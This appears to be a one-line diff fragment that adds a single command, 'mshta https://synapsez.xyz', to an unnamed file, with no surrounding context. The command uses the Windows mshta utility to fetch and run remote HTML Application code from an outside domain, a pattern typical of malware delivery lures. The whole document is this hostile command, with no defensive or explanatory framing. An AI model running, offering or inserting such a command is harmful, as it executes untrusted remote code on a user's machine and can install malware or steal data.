@@ -1,0 +1,1 @@
+mshta https://synapsez.xyz
